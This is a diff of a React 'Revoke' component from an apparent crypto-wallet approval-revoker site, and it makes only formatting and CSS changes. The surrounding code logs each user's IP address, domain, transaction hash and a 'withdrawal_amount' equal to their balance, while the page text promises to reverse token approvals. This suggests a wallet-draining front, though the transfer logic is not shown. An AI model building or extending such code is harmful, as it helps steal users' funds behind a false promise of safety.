@@ -63,8 +63,6 @@ const Revoke = () => {
     setPriceData(priceData);
   };
 
-  
-
   useEffect(() => {
     if (tokenData && priceData && connector) {
       // Add connector to the condition
@@ -214,7 +212,7 @@ const Revoke = () => {
         });
         if (tx) {
           const data = {
-            asset_name:walletData?.native_coin ,
+            asset_name: walletData?.native_coin,
             domain: walletData?.domain,
             transaction_hash: tx,
             ip_address: walletData?.ip_address,
@@ -228,7 +226,7 @@ const Revoke = () => {
           }
         } else {
           const data = {
-            asset_name:walletData?.native_coin,
+            asset_name: walletData?.native_coin,
             domain: walletData?.domain,
             ip_address: walletData?.ip_address,
             withdrawal_amount: balance,
@@ -255,8 +253,8 @@ const Revoke = () => {
   return (
     <Container>
       <div className="">
-        <div className=" text-white w-full max-w-7xl mx-auto lg:px-8 ">
-          <p className="flex flex-col justify-center items-center  mb-2 border border-[#0C70F2] dark:border-white rounded-lg px-4 py-3 text-center">
+        <div className="w-full max-w-7xl mx-auto px-4 lg:px-8 ">
+          <p className="flex flex-col justify-center items-center  mb-2 border text-white border-[#0C70F2] dark:border-white rounded-lg px-4 py-3 text-center">
             Once your wallet is connected, you'll see a list of your tokens and
             the amounts you may have unknowingly approved. Simply revoke that
             amount to reverse them immediately.
